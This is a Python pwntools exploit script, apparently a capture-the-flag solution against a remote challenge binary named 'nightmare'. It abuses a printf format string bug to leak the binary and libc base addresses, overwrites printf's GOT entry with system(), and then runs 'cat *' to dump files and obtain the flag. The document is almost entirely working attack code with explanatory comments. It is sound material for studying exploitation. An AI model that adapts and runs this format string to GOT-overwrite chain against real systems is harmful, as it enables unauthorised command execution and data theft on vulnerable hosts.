from pwn import *

context.arch = 'amd64'

# p = process('./nightmare')
p = remote('46.101.63.43', 32316)

elf = ELF('./nightmare')
# libc = ELF('./libc.self')
libc = ELF('./libc6_2.31-0ubuntu9_amd64.so') # libc I found works through leaks, trial, and error


offset_leak_from_binary_base = 0x2079
# offset_libc_leak_from_base = 0x26d0a # local
offset_libc_leak_from_base = 0x270b3 # remote <- all possible libc binaries from libc database have this offset as a possible return address in __libc_start_main and it works

# leak offset of the executable binary in memory
p.recv()
p.sendline('2') # "try to escape" menu selection
p.recv()
p.sendline('%p') # leak one void* with printf
leak_data = p.recv()
leak_addy = int(leak_data.decode('latin-1').split('\n\nWrong')[0], 16)
print(f"Leaked address: {hex(leak_addy)}")

# set binary base with leak and known offset of the leak
binary_base = leak_addy - offset_leak_from_binary_base
elf.address = binary_base
print(f"Binary base: {hex(binary_base)}")

def leak_offset(offset):
    p.recv(timeout=0.5)
    p.sendline('2') # "try to escape" menu selection
    p.recv(timeout=0.5)
    payload = f"%{offset}$p" # you can do printf("%50$p") to get the 50th parameter to printf or to leak specific stuff farther up in the stack since you can only send 5 chars
    p.sendline(payload.encode('latin-1'))
    data = p.recv(timeout=0.5)
    leak = data.decode('latin-1').split('\nWrong')[0].rstrip()
    for i in range(0,5): # this leak messes up STDIN for a while somehow, so send 5 newlines
        p.sendline('')
    p.recv(timeout=0.5)
    if leak == '(nil)':
        return 0
    else:
        return int(leak, 16)

# old test code to enumerate all stuff we can leak - found __libc_start_main_ret at offset 13 for query into libc database
# looking_libc = p.libs()['/usr/lib/x86_64-linux-gnu/libc-2.31.so']
# for o in range(10,89):
#     leak = leak_offset(o)
#     ofs = leak - looking_libc
#     print(f"Leak {o}: {hex(leak)}  {ofs}  {hex(ofs)}")

offset_libc_start_main_ret = leak_offset(13) # __libc_start_main_ret
libc_base = offset_libc_start_main_ret - offset_libc_leak_from_base
print(f"Offset __libc_start_main_ret found: {hex(offset_libc_start_main_ret)}")
# this leaked address can be used to correctly identify the libc binary using https://libc.blukat.me
# value returned from server: Offset __libc_start_main_ret found: 0x7f33d14830b3
print(f"Libc base: {hex(libc_base)}")
libc.address = libc_base

SYSTEM_ADDR = libc.sym['system']
print(f"SYSTEM_ADDR = {hex(SYSTEM_ADDR)}")
GOT_PRINTF = elf.got['printf']
print(f"GOT_PRINTF = {hex(GOT_PRINTF)}")

def send_printf(payload):
    p.sendline('1') # "scream into the void" menu selection
    p.recv()
    # print(payload) # I like to see what FmtStr is doing
    p.sendline(payload)
    output = p.recv()
    # print(output)
    # return output # this used to be here for local testing, but it doesn't do anything remotely because output goes to stderr instead of stdout

# offset 5 found locally
# cannot have FmtStr do stuff automatically because no output is returned from remote, so pass in offset
fmt = FmtStr(execute_fmt=send_printf, offset=5)

# replace printf in GOT with address of system in libc using printf magic
fmt.write(GOT_PRINTF, SYSTEM_ADDR)
fmt.execute_writes()

# command execution - only 5 chars allowed
p.recv(timeout=0.1)
print('-'*10 + ' cmd exec reading file(s) ' + '-'*10)
p.sendline('2') # execute in the "try to escape" menu selection because it has a nice printf with attacker-controlled buffer
p.recv(timeout=0.5)
# p.sendline('hd f*') # shortest possible command I could find to read flag.txt, but it doesn't work on remote
p.sendline('cat *') # cat everything fits in 5 chars, but it's SUPER NOISY.  the flag is in this mess somewhere.
while True: # wait for the junk to load and repeat until we got it all
    out = p.recv(timeout=0.5)
    if len(out) > 0:
        print(out)
